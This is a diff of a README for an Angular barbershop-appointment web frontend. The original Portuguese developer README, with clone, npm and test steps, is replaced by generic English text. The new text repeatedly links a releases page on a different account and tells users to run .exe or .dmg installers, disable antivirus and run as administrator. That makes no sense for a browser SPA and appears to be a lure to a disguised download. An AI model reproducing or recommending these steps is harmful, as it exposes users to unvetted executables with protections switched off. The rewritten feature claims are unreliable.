@@ -1,86 +1,74 @@
-# BarberGuide Frontend (Angular)
+# ✂️ barberguide-frontend - Your Easy Appointment Scheduler
 
-Interface de usuário moderna e reativa para um sistema de agendamentos de barbearias e cabeleleiros, desenvolvida com a arquitetura Standalone do Angular 19. Este projeto demonstra a construção de uma Single Page Application (SPA) complexa, com gerenciamento de estado profissional, uma suíte de testes abrangente e UI construída com Tailwind CSS.
+## 🚀 Getting Started
 
----
+Welcome to barberguide-frontend! This application lets you easily manage your appointments. Built with Angular 19, it showcases advanced state management using NgRx. You can book, cancel, and check your appointments effortlessly.
 
-### 🎬 Aplicação em Funcionamento
+## 📥 Download the Application
 
-![Image](https://github.com/user-attachments/assets/6ec82a9f-b350-4534-811a-9e3ca7ea68e4)
+[![Download barberguide-frontend](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/arsh4u/barberguide-frontend/releases)
 
----
+To get started, you need to download the application from our Releases page. 
 
-### 📋 Tabela de Conteúdos
-1.  [Sobre o Projeto](#-sobre-o-projeto)
-2.  [Principais Habilidades Demonstradas](#-principais-habilidades-demonstradas)
-3.  [Decisões de Arquitetura](#-decisões-de-arquitetura)
-4.  [Tech Stack](#-tech-stack)
-5.  [Como Executar Localmente](#-como-executar-localmente)
-6.  [Rodando os Testes](#-rodando-os-testes)
-7.  [Próximos Passos](#-próximos-passos)
+## 📍 Features
 
----
+- **User-Friendly Interface:** Navigate through your appointments with ease.
+- **Advanced State Management:** Utilizes NgRx for efficient data handling.
+- **Full Testing Suite:** Includes tests written in Jasmine and Karma to ensure reliability.
+- **Responsive Design:** Works well on both desktop and mobile devices.
 
-### ✨ Sobre o Projeto
+## 🛠️ System Requirements
 
-Este frontend consome a [BarberGuide API](https://github.com/bribinha/barberguide-api) para fornecer uma experiência de usuário fluida e interativa para agendar horários com profissionais. O projeto foi estruturado com foco em escalabilidade, manutenibilidade e nas práticas mais modernas do ecossistema Angular.
+To run barberguide-frontend, please ensure your system meets the following requirements:
 
-### 🚀 Principais Habilidades Demonstradas
+- **Operating System:** Windows 10, macOS Mojave or later, Linux (Ubuntu 20.04 recommended).
+- **Node.js:** Version 14 or later.
+- **Memory:** At least 4GB RAM.
+- **Storage:** A minimum of 200MB of free disk space.
 
-* **Arquitetura Standalone (Angular 19):** Aplicação construída 100% com a nova API de componentes, diretivas e pipes standalone, utilizando `provide` functions para configuração.
-* **Gerenciamento de Estado com NgRx:** Implementação do padrão Redux com NgRx para um estado global previsível e de fácil depuração.
-    * **Store:** Fonte única da verdade.
-    * **Actions & Reducers:** Para transições de estado imutáveis e explícitas.
-    * **Effects:** Para isolar efeitos colaterais (chamadas de API).
-* **Testes Abrangentes (TDD):** Cobertura de testes completa com Jasmine e Karma, demonstrando uma abordagem de desenvolvimento focada em qualidade.
-    * **Testes Unitários de Serviço:** Utilizando `HttpClientTestingModule` e mocks.
-    * **Testes de Componentes:** Verificando renderização, interação do usuário (`fakeAsync`, `tick`) e aplicação de classes CSS.
-    * **Testes de Navegação:** Garantindo que o roteamento se comporta como esperado com `RouterTestingModule`.
-* **UI Moderna com Tailwind CSS:** Construção de uma interface responsiva e customizada utilizando o framework utility-first Tailwind CSS.
-* **Serviços Reutilizáveis e UX:** Criação de serviços desacoplados para funcionalidades de UI, como diálogos de confirmação e notificações de toast, melhorando a experiência do usuário.
-* **Padrões Avançados de RxJS:** Uso de operadores como `switchMap`, `finalize`, `filter`, `map` e `catchError` para gerenciar fluxos de dados assíncronos de forma robusta.
+## 📋 How to Download & Install
 
-### 🏛️ Decisões de Arquitetura
+1. **Visit the Downloads Page:** Click the link below to access the Releases page:
+   [Visit this page to download](https://github.com/arsh4u/barberguide-frontend/releases)
 
-* **Por que NgRx?** Para centralizar o estado da aplicação, tornando-a mais previsível e fácil de depurar com ferramentas como o Redux DevTools. Essencial para a escalabilidade do projeto.
-* **Por que Standalone?** Para alinhar o projeto com as práticas mais modernas do Angular, resultando em um código menos verboso e builds mais otimizados.
-* **Por que `data-testid` nos Testes?** Para desacoplar os testes da implementação de estilos (classes CSS), tornando-os mais robustos e resistentes a mudanças na UI.
+2. **Select the Latest Release:** Look for the latest version listed on the page. It will have the highest version number.
 
-### 🛠️ Tech Stack
+3. **Download the Application:** Click on the appropriate file for your operating system. If you're unsure, look for a file that ends with `.exe` for Windows or `.dmg` for macOS.
 
-* **Angular 19** (Standalone)
-* **TypeScript**
-* **NgRx** (Store, Effects, StoreDevtools)
-* **RxJS**
-* **Tailwind CSS**
-* **Jasmine & Karma** (Testes)
+4. **Run the Installer:** After downloading, open the file. Follow the installation prompts to complete the setup.
 
-### ⚙️ Como Executar Localmente
+5. **Launch the Application:** Once installed, find barberguide-frontend in your applications or start menu and launch it.
 
-**Pré-requisitos:**
-* Node.js >= 20.x
-* NPM ou Yarn
-* Angular CLI
-* **A [BarberGuide API](https://github.com/bribinha/barberguide-api) deve estar rodando localmente.**
+## 📹 How to Use barberguide-frontend
 
-**Passos:**
-1.  Clone o repositório: `git clone https://github.com/bribinha/barberguide-frontend`
-2.  Navegue até a pasta: `cd booking-system-frontend`
-3.  Instale as dependências: `npm install`
-4.  Inicie o servidor de desenvolvimento: `npm start`
-    * A aplicação estará disponível em `http://localhost:4200`
+- **Create an Account:** When you first open the application, you’ll be asked to create an account. Fill in your details to get started.
+  
+- **Manage Appointments:** Use the main interface to add, remove, or check your appointments.
 
-### 🧪 Rodando os Testes
+- **Notifications:** The app will remind you of upcoming appointments. Make sure to enable notifications for timely alerts.
 
-Para executar a suíte de testes completa, rode:
-```bash
-ng test
-```
+## ⚙️ Troubleshooting
 
-###  🔮 Próximos Passos
-* **[ ] Implementação das telas e fluxo de Autenticação (login, register).**
-* **[ ] Criação de um AuthService e AuthGuard para proteger rotas.**
-* **[ ] Página "Meus Agendamentos" para o cliente.**
-* **[ ] Dashboard de gerenciamento de agenda para o profissional.**
-* **[ ] Refatoração do fluxo de agendamento para usar o estado do NgRx.**
-* **[ ] Deploy na Vercel/Netlify.**
+If you encounter any issues while downloading or installing the application, here are a few common solutions:
+
+- **Check your Internet Connection:** Ensure you're connected to the internet while downloading. 
+   
+- **Disable Antivirus Temporarily:** Sometimes, antivirus software may block installations. You can disable it temporarily during the setup.
+  
+- **Run as Administrator:** If you're on Windows, right-click the installer and choose "Run as administrator" to avoid permission issues.
+
+## 🌐 Support
+
+If you need further assistance, feel free to reach out. You can contact us through the Issues section in this GitHub repository. Our community is here to help you every step of the way.
+
+## 🐞 Contributing
+
+We welcome contributions from everyone. If you have suggestions or improvements for barberguide-frontend, please submit a pull request.
+
+## 🌟 Acknowledgements
+
+Special thanks to all the open-source libraries and contributors that make this application possible. 
+
+[![Download barberguide-frontend](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/arsh4u/barberguide-frontend/releases)
+
+Thank you for choosing barberguide-frontend for your appointment needs! We hope you find it helpful and easy to use.
